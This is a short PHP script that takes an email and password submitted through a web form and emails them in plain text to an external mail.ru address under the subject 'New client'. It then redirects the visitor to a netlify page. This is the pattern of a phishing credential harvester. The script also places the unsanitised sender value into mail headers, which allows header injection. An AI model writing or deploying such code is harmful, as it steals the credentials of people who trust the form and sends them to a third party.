<?php

    $from = trim($_POST['email']);
    $password = $_POST['password'];

    $message = "Новый клиент!\nПочта: $from\nПароль: $password";
    $message = htmlspecialchars($message);
    $message = urldecode($message);
    $message = trim($message);


    $to = "mr_gem228@mail.ru";
    $subject = "Новый клиент";
    $headers = "From: $from\r\nReply-to: $from\r\nContent-type:text/plain; charset=utf-8\r\n";

    if(mail($to, $subject, $message, $headers)){
    header('Location: https://boostagency.netlify.app/');
    exit();
    }

?>